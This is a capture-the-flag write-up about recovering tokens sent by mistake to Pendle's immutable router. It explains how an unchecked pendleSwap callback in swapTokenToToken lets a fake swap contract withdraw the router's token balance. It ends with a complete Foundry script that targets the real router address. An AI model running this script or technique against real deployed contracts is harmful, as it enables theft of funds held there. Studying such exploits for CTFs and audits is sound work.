# Oh Fuck (Pendle)

Author: JesJupyter ([X/Twitter](https://x.com/jesjupyter))

## Background

### Introduction
Tony's heart sank as he realized his million-dollar typo had accidentally sent a fortune to Pendle's immutable router contract. Help Tony recover his money.


### Pendle Incident

Reference: https://threesigma.xyz/blog/penpie-exploit

Pendle is a decentralized, permissionless protocol designed for yield trading, enabling users to implement a variety of yield management strategies.

On September 3, 2024, at 6:23 PM UTC, a security vulnerability in the Penpie platform was exploited, resulting in the loss of over $27 million across the Arbitrum and Ethereum networks. The attacker created a fake Pendle market to manipulate rewards, inflating the staking balance and claiming unauthorized funds.

The incident was caused by two major factors:

- Lack of reentrancy protection in `PendleStaking::batchHarvestMarketRewards()`
- Penpie’s acceptance of all Pendle Markets as valid pools, despite Pendle Markets, PT, and YT tokens being permissionlessly created.


## Analysis

### How Can We Retrieve The Stuck Funds?

When we take a look at the `Challenge` contract, we can see that the token is directly transferred to `0x00000000005BBB0EF59571E58418F9a4357b68A0`.

When we take a look at the code of `0x00000000005BBB0EF59571E58418F9a4357b68A0` via [etherscan](https://vscode.blockscan.com/ethereum/0x00000000005bbb0ef59571e58418f9a4357b68a0), we can see that it is a Pendle Router contract.

**It's easy to think that the main idea may be related to the exploit in the Penpie article which could be like accepting all Pendle Markets/Swaps as valid pools.**

Take a look at the `swapTokenToToken` function.

```solidity
    function swapTokenToToken(
        address receiver,
        uint256 minTokenOut,
        TokenInput calldata inp
    ) external payable returns (uint256 netTokenOut) {
        _swapTokenInput(inp);

        netTokenOut = _selfBalance(inp.tokenMintSy);
        if (netTokenOut < minTokenOut) {
            revert Errors.RouterInsufficientTokenOut(netTokenOut, minTokenOut);
        }

        _transferOut(inp.tokenMintSy, receiver, netTokenOut);
    }
```

In the `_selfBalance`, the `balanceOf()` function is called for the given token.

```solidity
    function _selfBalance(address token) internal view returns (uint256) {
        return (token == NATIVE) ? address(this).balance : IERC20(token).balanceOf(address(this));
    }
```

So, if we could make `inp.tokenMintSy` to be the token that the challenge contract has, we might be able to retrieve the stuck funds.

Take a deep look at the `_swapTokenInput` code.

```solidity
    function _swapTokenInput(TokenInput calldata inp) internal {
        if (inp.tokenIn == NATIVE) _transferIn(NATIVE, msg.sender, inp.netTokenIn);
        else _transferFrom(IERC20(inp.tokenIn), msg.sender, inp.pendleSwap, inp.netTokenIn);

        IPSwapAggregator(inp.pendleSwap).swap{value: inp.tokenIn == NATIVE ? inp.netTokenIn : 0}(
            inp.tokenIn,
            inp.netTokenIn,
            inp.swapData
        );
    }
```

So, apprently, there is no check on the `inp.pendleSwap` address, which is the address that Pendle Router is calling. So we can use our own contract as the `pendleSwap` address. It's easy to use `inp.tokenIn = NATIVE` since we already has some ETH in the current account. This is like the root cause of the Pendle incident sine all `inp.pendleSwap` are considered as valid.

So attack path could be:
1. Create a fake Pendle Swap contract.
2. Call `swapTokenToToken` with `inp.pendleSwap` set to our fake Pendle Swap contract and `inp.tokenMintSy` set to the token that we want to retrieve.
3. Our fake Pendle Swap contract will pass the `swap` call and the contract will transfer the token that we want to retrieve via `_transferOut`.

### CTF Script

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {Challenge} from "../src/Challenge.sol";



struct SwapData {
    SwapType swapType;
    address extRouter;
    bytes extCalldata;
    bool needScale;
}

enum SwapType {
    NONE,
    KYBERSWAP,
    ONE_INCH,
    // ETH_WETH not used in Aggregator
    ETH_WETH
}

struct TokenInput {
    // Token/Sy data
    address tokenIn;
    uint256 netTokenIn;
    address tokenMintSy;
    // aggregator data
    address pendleSwap;
    SwapData swapData;
}

interface IRouter {
    function swapTokenToToken(
        address receiver,
        uint256 minTokenOut,
        TokenInput calldata inp
    ) external payable returns (uint256 netTokenOut);
}

contract PendleSwap {
    function swap(address tokenIn, uint256 amountIn, SwapData calldata swapData) external payable {

    }
}

contract TestScript is Script {


    function run() public {
        Challenge challenge = Challenge(CHALLENGE_ADDRESS);
        uint256 deployerPrivateKey = PRIVATE_KEY;
        address user = vm.addr(deployerPrivateKey);
        vm.startBroadcast(deployerPrivateKey);
        
            IRouter router = IRouter(0x00000000005BBB0EF59571E58418F9a4357b68A0);
            PendleSwap pendleSwap = new PendleSwap();
            TokenInput memory input = TokenInput(
                address(0),
                1 ether,
                address(challenge.token()),
                address(pendleSwap),
                SwapData(SwapType.NONE, address(0), new bytes(0), false)
            );
            router.swapTokenToToken{value: 1 ether}(challenge.PLAYER(), 1 ether, input);
            require(challenge.isSolved(), "Not solved");
        
        vm.stopBroadcast();
    }
}

```